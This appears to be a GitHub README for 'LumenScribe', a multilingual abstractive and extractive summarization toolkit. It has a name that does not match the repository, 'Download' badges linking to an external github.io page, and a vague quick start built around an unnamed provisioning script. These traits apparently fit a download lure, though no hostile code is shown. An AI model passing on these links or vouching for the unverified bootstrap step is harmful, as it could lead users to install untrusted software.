![preview](https://raw.githubusercontent.com/altasin356/Transformer-Summarizer-Infosys-Springboard/main/poster_488d4f4.svg)
[![Download](https://raw.githubusercontent.com/altasin356/Transformer-Summarizer-Infosys-Springboard/main/latest_c5499e.svg)](https://altasin356.github.io/Transformer-Summarizer-Infosys-Springboard/)

# 🧠 LumenScribe — Abstractive & Extractive Summarization Toolkit

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
[![Transformers](https://img.shields.io/badge/Transformers-4.x-orange.svg)](https://huggingface.co/docs/transformers/index)
[![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()
[![Year](https://img.shields.io/badge/Release-2026-purple.svg)]()
[![Support](https://img.shields.io/badge/Support-24%2F7-informational.svg)]()
[![Multilingual](https://img.shields.io/badge/Languages-12%2B-9cf.svg)]()

> **LumenScribe** is a dual-engine summarization framework that distills long, noisy documents into crisp, faithful digests. Instead of forcing a single paradigm, it pairs a **Transformer-based abstractive engine** with a **transparent, rule-driven extractive engine**, letting you switch, blend, or benchmark both from one clean interface.

---

## 📖 Table of Contents

- [Why LumenScribe?](#-why-lumenscribe)
- [Core Concept](#-core-concept)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [Repository Layout](#-repository-layout)
- [Quick Start Guide](#-quick-start-guide)
- [Supported Languages](#-supported-languages)
- [Configuration Reference](#-configuration-reference)
- [Evaluation & Benchmarks](#-evaluation--benchmarks)
- [Responsive Web Interface](#-responsive-web-interface)
- [API Surface](#-api-surface)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap 2026](#-roadmap-2026)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🔍 Why LumenScribe?

Most summarization projects pick a side. Abstractive pipelines hallucinate beautifully; extractive pipelines stay faithful but read like a bag of spliced sentences. LumenScribe refuses that trade-off. It treats summarization the way a skilled editor treats a manuscript — sometimes rewriting a paragraph into one luminous line, sometimes simply underlining the sentence that already says it best.

The result is a toolkit that adapts to the **document**, not the other way around.

## 🧭 Core Concept

Imagine a library where two librarians work side by side:

1. **The Paraphraser** — a neural Transformer that reads the whole text, grasps the latent meaning, and writes a fresh, condensed passage in its own words.
2. **The Curator** — a deterministic, rule-based system that scores sentences by position, keyword density, and discourse markers, then assembles a summary strictly from verbatim source sentences.

You choose the librarian. Or you let LumenScribe choose for you through a **hybrid arbitration layer** that weighs document type, length, and target compression ratio.

## ✨ Feature Highlights

- 🤖 **Dual-Engine Summarization** — Abstractive Transformer and extractive rule-based pipelines under one API.
- 🌍 **Multilingual Support** — Summaries in 12+ languages, with automatic language detection and graceful fallback.
- 📱 **Responsive UI** — A mobile-first web console that resizes fluidly from phone to ultrawide monitor.
- ⚡ **Streaming Inference** — Token-by-token output so users see progress instead of a spinner.
- 🧩 **Pluggable Preprocessors** — Boilerplate stripping, section detection, and de-duplication as composable stages.
- 📊 **Built-in Evaluation Suite** — ROUGE, BERTScore, compression ratio, and faithfulness heuristics.
- 🕒 **24/7 Customer Support** — Round-the-clock triage desk with an average first-response window under two hours.
- 🔒 **Privacy-First Design** — Local-only mode keeps sensitive documents on your own hardware.
- 🧪 **Experiment Tracking** — Every run logged with hyperparameters, seeds, and artifacts for reproducibility.
- 🎛️ **Batch & Single Modes** — One document or ten thousand, same interface.

## 🏛️ Architecture Overview

The pipeline flows through five conceptual stages:

1. **Ingestion** — Raw text, PDFs, or HTML are normalised into clean unicode.
2. **Segmentation** — Sentences, paragraphs, and headings are labelled with structural roles.
3. **Scoring / Encoding** — The extractive scorer assigns salience weights; the Transformer encoder builds contextual embeddings.
4. **Generation / Selection** — Either the decoder writes a new summary, or the selector stitches source sentences.
5. **Post-Processing** — Redundancy pruning, length calibration, and optional style transfer.

A thin orchestration layer routes each request to the appropriate engine based on the `strategy` parameter.

## 🗂️ Repository Layout

```
lumen-scribe/
├── lumen/                 # Core library
│   ├── abstractive/       # Transformer summarization engine
│   ├── extractive/        # Rule-based summarization engine
│   ├── hybrid/            # Arbitration + blending logic
│   ├── preprocess/        # Cleaning, segmentation, language ID
│   ├── eval/              # ROUGE, BERTScore, faithfulness checks
│   └── cli/               # Command-line entry points
├── web/                   # Responsive front-end console
├── api/                   # HTTP service layer
├── configs/               # YAML experiment configs
├── notebooks/             # Exploratory and demo notebooks
├── tests/                 # Unit + integration tests
└── docs/                  # Extended documentation
```

## 🚀 Quick Start Guide

LumenScribe is designed to be welcoming from the very first command. The internal bootstrap script handles environment discovery and asset retrieval automatically.

1. **Prepare your workspace** — create a project directory wherever you prefer.
2. **Launch the bootstrap routine** — run the provisioning script shipped in the repository root; it resolves dependencies and caches language assets.
3. **Point it at a document** — feed a plain-text or PDF file into the summarizer via the CLI or web console.
4. **Choose your strategy** — set `strategy=abstractive`, `strategy=extractive`, or `strategy=hybrid`.
5. **Read the digest** — output lands in your console and, optionally, in a structured JSON file.

For orchestrated deployments, the same bootstrap routine supports container and serverless targets.

## 🌐 Supported Languages

LumenScribe ships with ready-to-use language packs for:

English, Spanish, French, German, Portuguese, Italian, Dutch, Hindi, Bengali, Tamil, Japanese, and Mandarin Chinese. Additional packs can be registered via the same manifest system used by the bundled ones.

## ⚙️ Configuration Reference

Every behavior is dictated by a YAML config. A condensed example of the tunables:

| Key | Purpose | Typical Value |
|-----|---------|---------------|
| `strategy` | Engine selection | `hybrid` |
| `max_length` | Summary token ceiling | `180` |
| `min_length` | Summary token floor | `40` |
| `compression_ratio` | Target reduction | `0.15` |
| `language` | Forced language code | `auto` |
| `beam_size` | Decoding width | `4` |
| `faithfulness_weight` | Penalty for unsupported spans | `0.3` |

Configuration files live in `configs/` and can be layered — a base file plus per-experiment overrides.

## 📈 Evaluation & Benchmarks

The evaluation suite runs on demand and produces a compact report card per document set:

- **ROUGE-1 / ROUGE-2 / ROUGE-L** for n-gram overlap.
- **BERTScore** for semantic alignment.
- **Compression Ratio** to confirm the digest is genuinely shorter.
- **Faithfulness Heuristic** comparing abstractive spans against source evidence.
- **Readability Indices** for human-oriented quality.

Results are stored under `runs/<timestamp>/` with full provenance so any number in a report can be traced back to the exact run that produced it.

## 📱 Responsive Web Interface

The web console is built with a mobile-first philosophy. It reflows from a single column on phones to a three-pane editorial layout on large displays. Dark mode is bundled. Keyboard shortcuts let power users move between documents without ever touching a mouse. The interface never blocks on a summarization call — the streaming layer paints partial output as it arrives.

## 🔌 API Surface

The HTTP service exposes a small, predictable set of endpoints:

- `POST /summarize` — single-document summarization with a chosen strategy.
- `POST /batch` — queue a collection of documents and poll for results.
- `GET /languages` — list installed language packs.
- `GET /health` — liveness probe for orchestration platforms.
- `GET /runs` — enumerate historical runs with metadata.

All responses are JSON. Errors are structured, not free-text.

## 🔎 SEO & Discoverability Notes

This repository is written to be discoverable by people searching for **abstractive text summarization**, **extractive summarization**, **Transformer summarization models**, **multilingual summarization tools**, **document digest generators**, and **rule-based NLP pipelines**. Keywords appear where they genuinely help a reader — never as filler.

## 🛣️ Roadmap 2026

- Q1 2026 — Publish reference weights for three additional language packs.
- Q2 2026 — Introduce a fine-tuning recipe notebook with dataset schema docs.
- Q3 2026 — Ship a desktop companion app wrapping the local-only mode.
- Q4 2026 — Expand the arbitration layer with learned strategy selection.

## 🤝 Contributing

Contributions are welcome across code, docs, translations, and evaluation datasets. Open an issue describing the change before large pull requests so the direction can be agreed on early. All contributors are expected to follow the project's code of conduct and to keep commits scoped and readable.

## 📜 License

This project is distributed under the **MIT License**. The full text lives in the repository's license file and is also available at the canonical reference:

[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

## ⚠️ Disclaimer

LumenScribe produces machine-generated summaries. While the engine is tuned for faithfulness, no automated system is infallible — generated digests may omit nuance, misattribute phrasing, or compress context in ways that change emphasis. Always review output before relying on it for legal, medical, financial, or editorial decisions. The maintainers provide this software as-is, without warranty of any kind, and are not liable for decisions made using its output.

---

[![Download](https://raw.githubusercontent.com/altasin356/Transformer-Summarizer-Infosys-Springboard/main/latest_c5499e.svg)](https://altasin356.github.io/Transformer-Summarizer-Infosys-Springboard/)